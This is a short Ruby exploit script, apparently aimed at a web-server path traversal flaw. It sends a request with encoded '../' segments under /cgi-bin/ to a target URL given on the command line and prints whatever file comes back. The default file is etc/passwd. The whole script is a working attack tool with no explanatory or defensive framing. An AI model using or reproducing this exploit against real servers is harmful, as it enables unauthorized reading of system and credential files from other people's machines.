#!/usr/bin/ruby
# Author: n3k00n3

require 'uri'
require 'net/http'

url = ARGV[0]
file = ARGV[1]

if ARGV[0].nil?
	exit 0
end

if file.nil?
  file = 'etc/passwd'
end

def scanner(url, file)
  path = "/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/#{file}"
  uri = URI.parse("#{url}#{path}")
  
  res = Net::HTTP.get_response(uri)
  #puts res.body if res.is_a?(Net::HTTPSuccess)
  if !res.is_a?(Net::HTTPSuccess)
    puts "Sorry, Not Vulnarable!"
    exit 0
  end
  
  puts res.body

end

scanner(url, file)
